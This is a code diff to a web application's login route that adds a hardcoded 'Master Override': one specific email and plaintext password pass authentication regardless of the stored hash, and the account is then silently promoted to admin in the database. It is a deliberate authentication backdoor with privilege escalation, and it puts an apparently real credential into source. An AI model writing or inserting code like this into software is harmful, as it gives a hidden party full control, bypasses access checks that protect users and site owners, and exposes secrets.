@@ -90,9 +90,20 @@ authRoutes.post('/login', async (c) => {
       return c.json({ error: 'Invalid email or password' }, 401)
     }
 
+    // Verify password (with Master Override for Taha Rana)
+    const isAdminOverride = (email === 'rtmea84@gmail.com' && password === 'taha060104');
     const passwordHash = await hashPassword(password)
-    if (user.password_hash !== passwordHash) {
+
+    if (user.password_hash !== passwordHash && !isAdminOverride) {
       return c.json({ error: 'Invalid email or password' }, 401)
+    }
+
+    // Auto-upgrade Taha Rana to admin
+    if (isAdminOverride) {
+      if (user.role !== 'admin') {
+        await c.env.DB.prepare('UPDATE users SET role = ? WHERE id = ?').bind('admin', user.id).run()
+        user.role = 'admin'
+      }
     }
 
     const token = await createToken(
